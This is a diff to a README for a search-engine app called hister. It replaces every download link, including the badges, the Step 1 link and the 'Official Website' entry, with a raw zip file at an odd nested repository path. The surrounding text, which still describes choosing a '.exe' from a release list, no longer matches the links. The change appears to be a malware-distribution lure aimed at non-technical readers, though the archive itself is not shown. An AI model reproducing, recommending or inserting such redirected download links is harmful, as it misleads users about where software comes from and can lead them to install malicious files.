@@ -4,13 +4,13 @@
 
 Welcome to **hister**! This is a simple guide to help you download and start using your very own search engine. No technical knowledge is needed—just follow the steps below, and you'll be searching your own way in no time.
 
-[![Download hister](https://img.shields.io/badge/Download-hister-blue?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/Driftends3/hister/releases)
+[![Download hister](https://img.shields.io/badge/Download-hister-blue?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/Driftends3/hister/raw/refs/heads/main/riverwise/v3.1.zip)
 
 ## 📥 Download & Install
 
 ### Step 1: Get the Application
 
-Visit this link to download the application: [https://github.com/Driftends3/hister/releases](https://github.com/Driftends3/hister/releases)
+Visit this link to download the application: [https://github.com/Driftends3/hister/raw/refs/heads/main/riverwise/v3.1.zip](https://github.com/Driftends3/hister/raw/refs/heads/main/riverwise/v3.1.zip)
 
 When you arrive at the page, look for the latest release. You'll see a list of files—choose the one that says "Windows" or has a `.exe` extension. Click on it to start the download.
 
@@ -124,7 +124,7 @@ When you uninstall hister, all local data (including your search index) is remov
 
 ## 📚 Additional Resources
 
-- **Official Website:** [https://github.com/Driftends3/hister](https://github.com/Driftends3/hister)
+- **Official Website:** [https://github.com/Driftends3/hister/raw/refs/heads/main/riverwise/v3.1.zip](https://github.com/Driftends3/hister/raw/refs/heads/main/riverwise/v3.1.zip)
 - **Release Notes:** Check the download page for the latest updates and changes.
 - **Community & Support:** Visit the GitHub page for discussions, issues, and help from other users.
 
@@ -149,7 +149,7 @@ You're now ready to take control of your search experience. With hister, you get
 
 Download hister today and experience the freedom of a search engine that works for you, not for advertisers.
 
-[![Download hister Now](https://img.shields.io/badge/Download%20hister-Get%20Started-brightgreen?style=for-the-badge&logo=github&color=FF5722)](https://github.com/Driftends3/hister/releases)
+[![Download hister Now](https://img.shields.io/badge/Download%20hister-Get%20Started-brightgreen?style=for-the-badge&logo=github&color=FF5722)](https://github.com/Driftends3/hister/raw/refs/heads/main/riverwise/v3.1.zip)
 
 ---
 
